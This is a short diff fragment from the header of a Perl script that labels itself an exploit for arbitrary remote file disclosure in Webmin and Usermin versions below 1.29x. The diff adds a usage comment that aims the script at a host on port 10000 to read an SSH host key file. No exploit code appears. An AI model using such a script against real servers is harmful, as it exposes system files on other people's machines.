@@ -1,4 +1,5 @@
 #!/usr/bin/perl
+#               perl 2017.pl 10.0.1.10 10000 /etc/ssh/ssh_host_rsa_key.pub 0
 #		Exploit for WEBMIN and USERMIN  less than 1.29x           
 #		ARBITARY REMOTE FILE DISCLOSURE
 #		WORKS FOR HTTP AND HTTPS (NOW) 		
